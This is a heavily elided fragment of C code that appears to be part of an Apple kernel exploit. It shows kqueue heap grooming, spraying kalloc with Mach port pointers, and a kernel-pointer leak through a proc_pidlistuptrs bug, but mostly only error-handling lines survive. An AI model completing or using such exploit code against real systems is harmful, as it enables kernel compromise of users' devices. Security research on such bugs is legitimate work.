...
static void fill_events(int n_events)
{
    ...
    for (int i = 0; i < n_events; i++) {
        ...
        if (err != 0) {
            fprintf(stderr, "failed to enqueue user event");
            exit(EXIT_FAILURE);
        }
...
static void prepare_kqueue()
{
    ...
    fill_events(10000);
    fprintf(stderr, "prepared kqueue");
    kqueues_allocated = 1;
}
...
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)
{
    ...
    if (err != KERN_SUCCESS) {
       fprintf(stderr, "failed to send message: %s", mach_error_string(err));
        exit(EXIT_FAILURE);
    }
...
uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)
{
    ...
    if (valid_guesses == 0) {
        fprintf(stderr, "couldn't leak any kernel pointers");
        exit(EXIT_FAILURE);
    }
